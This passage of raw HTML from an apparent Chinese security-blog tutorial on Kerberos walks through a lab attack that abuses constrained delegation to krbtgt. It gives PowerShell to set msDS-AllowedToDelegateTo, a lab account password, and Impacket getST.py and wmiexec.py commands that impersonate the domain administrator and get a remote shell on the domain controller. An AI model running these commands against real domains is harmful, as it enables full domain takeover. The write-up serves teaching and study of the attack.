&quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGS</code>默认的spn是<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">krbtgt/domain name</code>，我们操作环境是<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">krbtgt/QIYOU.COM</code><br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。<br style="-webkit-tap-highlight-color: transparent;"  />我们可以使用powershell来添加</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ActiveDirectory</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$user </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ADUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> test </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Properties</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"msDS-AllowedToDelegateTo"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ADObject</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $user </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">@{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"msDS-AllowedToDelegateTo"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">@(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"krbtgt/0day.org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />我们控制的用户选择的是自己创建的 test 域用户。密码Yicunyiye123<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域控：OWA2010SP3 192.168.200.146</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域：0day.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>攻击机：Kali</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />首先修改 kali 的/etc/hosts/文件，添加如下内容<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">200.146</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">200.146</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> OWA2010SP3</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8210862619808307" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/64_1QCZZwfQWBKCtT5dibrhgtxrO7QULA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHW0IDicriaiaIOFXpqDK5qicUwqYs1QCZZwfQWBKCtT5dibrhgtxrO7QULA/640?wx_fmt=png'" data-type="png" data-w="626" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />创建域用户test然后赋予SPN<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23684210526315788" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/65_7upzT3My6ZGDllibcABK4B5CWjXFZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfpbmHtQyUgsyErxM7ia9OicLRuk7upzT3My6ZGDllibcABK4B5CWjXFZw/640?wx_fmt=png'" data-type="png" data-w="874" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后在域控上配置test用户到krbtgt用户的约束性委派。&nbsp;</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ActiveDirectory</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$user </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ADUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> test </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Properties</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"msDS-AllowedToDelegateTo"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ADObject</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $user </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">@{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"msDS-AllowedToDelegateTo"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">@(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"krbtgt/0day.org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.06901960784313725" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/66_vhbsBWib4WaNXn6o8TQiayN3w2wwDg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjUNu0EWRaDvaQicbgIZTGdGMy0DvhbsBWib4WaNXn6o8TQiayN3w2wwDg/640?wx_fmt=png'" data-type="png" data-w="1275" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="1.2261904761904763" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/67_H2c26traqic2BXeqtJSyf1hqcGzh7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI54wXgeIMUFAict4ZZ9IoVmKOVNH2c26traqic2BXeqtJSyf1hqcGzh7A/640?wx_fmt=png'" data-type="png" data-w="420" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">可以看到test账户具有委派性</span><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3570336391437309" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/68_WhEo4Q9xz8hTEZm0qY8LqxibzQTNDA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIyc2NRCG1nGibBSZRwrV72f1qNBWhEo4Q9xz8hTEZm0qY8LqxibzQTNDA/640?wx_fmt=png'" data-type="png" data-w="1308" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />然后在kali上攻击<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python3 getST</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ip </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">200.146</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">spn krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">impersonate administrator </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">test</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Yicunyiye123</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8112" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/69_ic2xPpS3Uic1ekSialvrGTOO2hMkzA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgBBSsCP4L0Cic1LtY2tKsAHKKLabic2xPpS3Uic1ekSialvrGTOO2hMkzA/640?wx_fmt=png'" data-type="png" data-w="625" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">export</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> KRB5CCNAME</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ccache</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python3 wmiexec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">no</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">pass</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">k administrator@OWA2010SP3 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ip </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">200.146</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7912087912087912" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/70_pibnI3vBlSQmZpxzGsmEnbUOiaSxMQ.png" 